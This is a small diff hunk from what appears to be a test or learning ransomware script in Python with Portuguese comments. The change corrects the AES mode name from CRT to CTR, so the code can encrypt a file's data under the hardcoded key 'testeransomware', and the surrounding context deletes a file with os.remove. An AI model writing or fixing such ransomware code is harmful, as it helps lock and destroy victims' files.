@@ -14,7 +14,7 @@ os.remove(file_name)
 
 # Definir chave de encriptacao
 key = b"testeransomware"
-aes = pyaes.AESModeOfOperationCRT(key)
+aes = pyaes.AESModeOfOperationCTR(key)
 
 # Criptogafa o arquivo
 crypto_data = aes.encrypt(file_data)
